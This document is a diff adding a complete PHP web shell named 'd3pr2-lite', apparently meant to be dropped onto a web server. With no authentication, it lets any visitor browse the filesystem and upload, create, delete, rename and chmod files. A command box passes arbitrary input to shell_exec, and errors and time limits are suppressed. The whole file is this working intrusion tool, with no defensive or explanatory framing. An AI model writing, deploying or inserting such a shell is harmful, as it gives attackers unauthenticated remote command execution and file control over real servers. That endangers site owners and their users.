@@ -1,0 +1,158 @@
+<?php
+// d3pr2-lite | minimal functional shell
+error_reporting(0);
+set_time_limit(0);
+
+$p = isset($_GET['p']) ? realpath($_GET['p']) : __DIR__;
+if (!$p || !is_dir($p)) $p = __DIR__;
+
+function perms($f){ return substr(sprintf('%o', @fileperms($f)), -4); }
+
+// ===== ACTIONS =====
+if (isset($_POST['up']) && !empty($_FILES['f']['name'])) {
+    move_uploaded_file($_FILES['f']['tmp_name'], $p.'/'.basename($_FILES['f']['name']));
+    header('Location: ?p='.urlencode($p)); exit;
+}
+if (isset($_POST['new']) && trim($_POST['n'])) {
+    file_put_contents($p.'/'.trim($_POST['n']), '');
+    header('Location: ?p='.urlencode($p)); exit;
+}
+if (isset($_GET['del'])) {
+    $t = $p.'/'.$_GET['del'];
+    is_file($t) ? @unlink($t) : @rmdir($t);
+    header('Location: ?p='.urlencode($p)); exit;
+}
+if (isset($_POST['ren']) && isset($_POST['old'], $_POST['new'])) {
+    @rename($p.'/'.$_POST['old'], $p.'/'.$_POST['new']);
+    header('Location: ?p='.urlencode($p)); exit;
+}
+if (isset($_POST['chmod']) && isset($_POST['t'], $_POST['m'])) {
+    @chmod($p.'/'.$_POST['t'], octdec($_POST['m']));
+    header('Location: ?p='.urlencode($p)); exit;
+}
+
+$out = '';
+if (isset($_POST['cmd']) && trim($_POST['c'])) {
+    $out = shell_exec('cd '.escapeshellarg($p).' && '.trim($_POST['c']).' 2>&1');
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>d3pr2-lite</title>
+<style>
+body{background:#000;color:#fff;font-family:monospace;font-size:13px;margin:0;padding:10px 10px 260px}
+a{color:#0f0;text-decoration:none}
+a:hover{text-decoration:underline}
+input,button{background:#111;color:#0f0;border:1px solid #0f0;padding:3px 6px;font-family:monospace;font-size:13px}
+button:hover{background:#0f0;color:#000}
+table{width:100%;border-collapse:collapse;margin:8px 0}
+td,th{padding:3px 6px;border-bottom:1px solid #222;text-align:left}
+th{color:#0f0}
+.delbtn{color:#f00;border:1px solid #f00;padding:2px 7px;text-decoration:none;display:inline-block}
+.delbtn:hover{background:#f00;color:#000}
+.w{color:#0f0}   /* writable */
+.nw{color:#f00}  /* not writable */
+#term{position:fixed;bottom:0;left:0;right:0;background:#000;border-top:1px solid #0f0;padding:8px}
+#term pre{background:#0a0a0a;color:#0f0;height:150px;overflow:auto;margin:5px 0;padding:6px;white-space:pre-wrap;border:1px solid #1a1a1a}
+form.inline{display:inline}
+</style>
+</head>
+<body>
+
+<div>
+<a href="?p=<?=urlencode(__DIR__)?>">[HOME]</a> |
+PATH: 
+<?php
+$parts = explode('/', trim($p,'/'));
+$build = '';
+echo '<a href="?p=/">/</a>';
+foreach($parts as $part){
+    if($part==='') continue;
+    $build .= '/'.$part;
+    echo '<a href="?p='.urlencode($build).'">'.htmlspecialchars($part).'</a>/';
+}
+?>
+</div>
+
+<form method="post" enctype="multipart/form-data" style="margin:8px 0">
+Upload: <input type="file" name="f"> <button name="up">UP</button>
+&nbsp;|&nbsp;
+New file: <input type="text" name="n" size="15"> <button name="new">CREATE</button>
+</form>
+
+<table>
+<tr><th>name</th><th>size</th><th>perms</th><th>actions</th></tr>
+<?php if($p !== '/'): ?>
+<tr><td colspan="4"><a href="?p=<?=urlencode(dirname($p))?>">.. (up)</a></td></tr>
+<?php endif; ?>
+
+<?php
+$items = @scandir($p) ?: [];
+$dirs = $files = [];
+foreach($items as $i){
+    if($i==='.'||$i==='..') continue;
+    is_dir($p.'/'.$i) ? $dirs[]=$i : $files[]=$i;
+}
+sort($dirs); sort($files);
+
+foreach($dirs as $d):
+    $f = $p.'/'.$d;
+    $wc = is_writable($f) ? 'w' : 'nw';
+?>
+<tr>
+<td><a href="?p=<?=urlencode($f)?>"><?=htmlspecialchars($d)?>/</a></td>
+<td>-</td>
+<td class="<?=$wc?>"><?=perms($f)?></td>
+<td>
+<form class="inline" method="post">
+<input type="hidden" name="old" value="<?=htmlspecialchars($d)?>">
+<input type="text" name="new" size="12" value="<?=htmlspecialchars($d)?>">
+<button name="ren">REN</button>
+</form>
+<form class="inline" method="post">
+<input type="hidden" name="t" value="<?=htmlspecialchars($d)?>">
+<input type="text" name="m" size="4" value="<?=perms($f)?>">
+<button name="chmod">CHMOD</button>
+</form>
+<a class="delbtn" href="?p=<?=urlencode($p)?>&del=<?=urlencode($d)?>" onclick="return confirm('DEL?')">DEL</a>
+</td>
+</tr>
+<?php endforeach; ?>
+
+<?php foreach($files as $file):
+    $f = $p.'/'.$file;
+    $wc = is_writable($f) ? 'w' : 'nw';
+?>
+<tr>
+<td><?=htmlspecialchars($file)?></td>
+<td><?=filesize($f)?></td>
+<td class="<?=$wc?>"><?=perms($f)?></td>
+<td>
+<form class="inline" method="post">
+<input type="hidden" name="old" value="<?=htmlspecialchars($file)?>">
+<input type="text" name="new" size="12" value="<?=htmlspecialchars($file)?>">
+<button name="ren">REN</button>
+</form>
+<form class="inline" method="post">
+<input type="hidden" name="t" value="<?=htmlspecialchars($file)?>">
+<input type="text" name="m" size="4" value="<?=perms($f)?>">
+<button name="chmod">CHMOD</button>
+</form>
+<a class="delbtn" href="?p=<?=urlencode($p)?>&del=<?=urlencode($file)?>" onclick="return confirm('DEL?')">DEL</a>
+</td>
+</tr>
+<?php endforeach; ?>
+</table>
+
+<div id="term">
+<form method="post">
+CMD: <input type="text" name="c" style="width:75%" value="<?=isset($_POST['c'])?htmlspecialchars($_POST['c']):''?>" autofocus>
+<button name="cmd">EXEC</button>
+</form>
+<pre><?=htmlspecialchars($out)?></pre>
+</div>
+
+</body>
+</html>
